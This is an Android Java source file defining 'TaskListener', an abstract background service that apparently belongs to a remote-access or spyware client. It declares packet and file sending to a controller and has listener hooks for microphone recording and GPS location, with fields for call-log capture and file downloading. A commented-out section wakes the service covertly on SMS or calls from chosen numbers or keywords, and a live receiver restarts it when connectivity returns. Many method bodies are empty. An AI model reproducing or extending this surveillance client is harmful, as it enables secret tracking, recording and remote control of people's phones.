package sub.app.entry;

import java.io.File;

import sub.app.func.CallLogListener;
import sub.app.func.FileDownloader;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.IBinder;
import android.widget.Toast;


public abstract class TaskListener extends Service implements OnRecordPositionUpdateListener, LocationListener {

	public abstract boolean sendSerialPacket(byte opcode, int channel, byte[] body);
	public abstract boolean sendFilePacket(byte opcode, int channel, File file);
	public abstract void handleData(byte opcode, int channel, byte[] data);

	public abstract void ResetConnection();

	public CallLogListener callLogLister = null;
	public FileDownloader fileDownloader = null;
	public Toast toast = null;
	
	protected boolean isConnected = true;
	
	public TaskListener() {
		super();
	    //IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
	    //registerReceiver(ConnectivityCheckReceiver, filter);
	}
	
	public void onLocationChanged(Location location) {
//		Log.d("gps", "decide geo");
		try{
		}
		catch(Exception e)
		{
		}
	}

	public void onProviderDisabled(String provider) {
//		Log.d("Info","GPS desactivated");
	}

	public void onProviderEnabled(String provider) {
//		Log.d("Info","GPS Activated");
	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		//We really don't care
	}
	
	
	public void onPeriodicNotification(AudioRecord recorder) {
//		Log.i("AudioStreamer", "Audio Data received !");
		try {
		}
		catch(Exception e)
		{
		}
	}
	
	
	public void onMarkerReached(AudioRecord recorder) {
//		Log.d("Info","Marker reached for audio streaming");
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	
/*	
	 protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {
		 	
		 	private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
		 
	        @Override
	        public void onReceive(Context context, Intent intent) {

			 	if(intent.getAction().equals(SMS_RECEIVED)) {
			 		Log.i("SMSReceived", "onReceive sms !");
			 		
					Bundle bundle = intent.getExtras();
					if (bundle != null) {
						Object[] pdus = (Object[]) bundle.get("pdus");
						 
						final SmsMessage[] messages = new SmsMessage[pdus.length];
						for (int i = 0; i < pdus.length; i++)  {
							 messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						}
						if (messages.length > -1) {
							
							 final String messageBody = messages[0].getMessageBody();
							 final String phoneNumber = messages[0].getDisplayOriginatingAddress();
						
							if(blockNumbersCall != null) {
								boolean found = false;
								boolean foundk = false;
								for(String s: blockNumbersSMS) {
									if(s.equals(phoneNumber))
										found = true;
								}
								if(!found)
									return;
								if(blockSMSKeywords != null) {
									for(String s: blockSMSKeywords) {
										if(messageBody.contains(s))
											foundk = true;
									}
									if(!foundk)
										return;
								}
								Log.i("Client","Incoming call authorized");
							}
							
							Intent serviceIntent = new Intent(context, Task.class);
							serviceIntent.setAction("SMSReceiver");
							context.startService(serviceIntent);
						}
					}
			 	}
	        }
	 };
	
	 protected BroadcastReceiver Callreceiver = new BroadcastReceiver() {
		 private static final String TAG = "CallReceiver";
		 
		@Override
		public void onReceive(final Context context, final Intent intent) {
			Log.i(TAG, "Call state changed !");
			final String action = intent.getAction();
			
			if (action.equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
				
				final String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
				final String phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
				
				if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
					Log.i(TAG,"Incoming call");
					
					if(blockNumbersCall != null) {
						boolean found = false;
						for(String s: blockNumbersCall) {
							if(s.equals(phoneNumber))
								found = true;
						}
						if(!found)
							return;
						Log.i(TAG,"Incoming call authorized");
					}

					Intent serviceIntent = new Intent(context, Task.class);
					serviceIntent.setAction("CallReceiver");
					context.startService(serviceIntent);
				}
				
			} else {// Default event code

				final String data = intent.getDataString();
				Log.i(TAG, "broadcast : action=" + action + ", data=" + data);

			}
		}

	 };
*/	 
	 
	 
	public final BroadcastReceiver ConnectivityCheckReceiver = new BroadcastReceiver() {
		
		//private String TAG = "ConnectivityReceiver";
		
	    @Override
	    public void onReceive(Context context, Intent intent) {
	    	try{
		        //String action = intent.getAction();
		        String type = "";
		        boolean state = false;;
		        //isConnected = intent.getBooleanExtra(ConnectivityManager.EXTRA_NO_CONNECTIVITY, false);
		
		        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		        NetworkInfo TestCo = connectivityManager.getActiveNetworkInfo();
		        if(TestCo == null)
		        	state = false;
		        else
		        	state = true;
		        
		        NetworkInfo networkInfo = (NetworkInfo) intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
		        if(networkInfo.getType() == ConnectivityManager.TYPE_WIFI)
		        	type = "Wifi";
		        else if(networkInfo.getType() == ConnectivityManager.TYPE_MOBILE)
		        	type = "3g";
		        else
		        	type = "other";
		
		        if(state){
	//	        	Log.w(TAG, "Connection is Available "+type);
		        	if(!isConnected) {
						Intent serviceIntent = new Intent(context, Task.class);
						serviceIntent.setAction("ConnectivityCheckReceiver");
						context.startService(serviceIntent);
		        	}
			    }
			    else {
	//		    	Log.w(TAG, "Connection is not Available "+type);
			    }
		        isConnected = state;
	    	}
	    	catch(Exception e)
	    	{
	    	}
	    }
	};
}
